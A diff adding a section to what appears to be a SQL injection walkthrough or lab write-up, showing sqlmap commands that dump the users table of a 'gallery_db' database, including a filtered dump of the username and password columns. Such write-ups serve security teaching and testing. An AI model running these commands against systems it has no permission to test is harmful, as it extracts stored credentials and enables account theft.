@@ -204,3 +204,13 @@ Table: users
 | username     | text         |
 +--------------+--------------+
 ```
+
+### Getting Records for a Table
+
+Now I can get records for the users table. If I don't want to filter the columns I can run the following:
+
+`sqlmap -r request.txt -D gallery_db -T users --dump`
+
+In my case I want to filter it. This is because it will ask yes or no questions over and over to get each character of data. That takes a lot of time and I want to speed things up. Here is the command I run to filter the columns that I want for each record:
+
+`sqlmap -r request.txt -D gallery_db -T users -C firstname,username,password --dump`
